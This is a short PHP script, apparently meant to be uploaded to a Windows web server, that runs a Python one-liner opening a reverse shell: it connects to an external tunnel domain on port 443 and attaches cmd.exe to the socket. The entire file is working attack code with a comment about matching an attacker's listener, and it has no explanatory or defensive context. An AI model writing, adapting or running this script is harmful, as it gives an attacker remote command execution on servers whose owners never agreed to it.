<?php
$domain = '157d3e48113727.lhr.life'; // use the domain name
$port = 443; // must match your listener port

$cmd = "python -c \"import socket,subprocess,os;" .
       "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);" .
       "s.connect(('$domain',$port));" .
       "os.dup2(s.fileno(),0);" .
       "os.dup2(s.fileno(),1);" .
       "os.dup2(s.fileno(),2);" .
       "subprocess.call(['cmd.exe'])\"";

system($cmd);
?>
